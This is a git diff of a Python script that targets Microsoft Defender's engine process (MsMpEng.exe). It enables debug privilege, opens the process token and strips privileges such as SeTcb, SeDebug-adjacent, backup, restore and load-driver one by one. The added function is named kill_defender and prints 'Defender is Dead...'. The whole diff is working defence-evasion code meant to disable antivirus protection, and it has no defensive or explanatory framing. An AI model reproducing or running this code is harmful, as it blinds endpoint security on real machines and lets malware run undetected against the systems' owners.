@@ -97,38 +97,39 @@ def get_pid(process_name):
     pid = get_procid_from_name(process_name, processes)
     return pid
 
-def set_privilege_none(pid):
-    # Local Priv, Priv To Lookup, LUID of Priv
-    new_privs = (
-        (win32security.LookupPrivilegeValue('', SE_SECURITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_CHANGE_NOTIFY_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_TCB_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_IMPERSONATE_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_LOAD_DRIVER_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_RESTORE_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_BACKUP_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_SECURITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_SYSTEM_ENVIRONMENT_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_INCREASE_QUOTA_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_TAKE_OWNERSHIP_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_INC_BASE_PRIORITY_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_SHUTDOWN_NAME),win32security.SE_PRIVILEGE_REMOVED),
-        (win32security.LookupPrivilegeValue('', SE_ASSIGNPRIMARYTOKEN_NAME),win32security.SE_PRIVILEGE_REMOVED),
-    )
-
-    ph = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
-    print(f"Got handle to Process: {pid}")
-    th = win32security.OpenProcessToken(ph, TOKEN_ALL_ACCESS)
-    print(f"Got security token of Process: {pid}")
-    modified_privs = win32security.AdjustTokenPrivileges(th, 0, new_privs)
-    win32security.AdjustTokenPrivileges(th, 0, modified_privs)
-    print("Selected process has been stripped of privileges.")
+def kill_defender():
+    print("Attempting to kill defender")
+    privs = [
+        SE_SECURITY_NAME, 
+        SE_CHANGE_NOTIFY_NAME,
+        SE_TCB_NAME,
+        SE_IMPERSONATE_NAME,
+        SE_LOAD_DRIVER_NAME,
+        SE_RESTORE_NAME,
+        SE_BACKUP_NAME,
+        SE_SECURITY_NAME,
+        SE_SYSTEM_ENVIRONMENT_NAME,
+        SE_INCREASE_QUOTA_NAME,
+        SE_TAKE_OWNERSHIP_NAME,
+        SE_INC_BASE_PRIORITY_NAME,
+        SE_SHUTDOWN_NAME,
+        SE_ASSIGNPRIMARYTOKEN_NAME,
+    ]
+    pid = get_pid("MsMpEng.exe")
+    flags = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
+    proc_handle = win32security.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
+    htoken = win32security.OpenProcessToken(proc_handle, flags)
+    for priv in privs:
+        id = win32security.LookupPrivilegeValue(None, priv)
+        new_privileges = [(id, SE_PRIVILEGE_REMOVED)]
+        win32security.AdjustTokenPrivileges(htoken, 0, new_privileges)
+    print("Defender is Dead...")
+    
     
 
 def main():
     enable_debug_privilege()
-    process_id = get_pid("MsMpEng.exe")
-    set_privilege_none(process_id)
+    kill_defender()
 
 if __name__=="__main__":
     main()
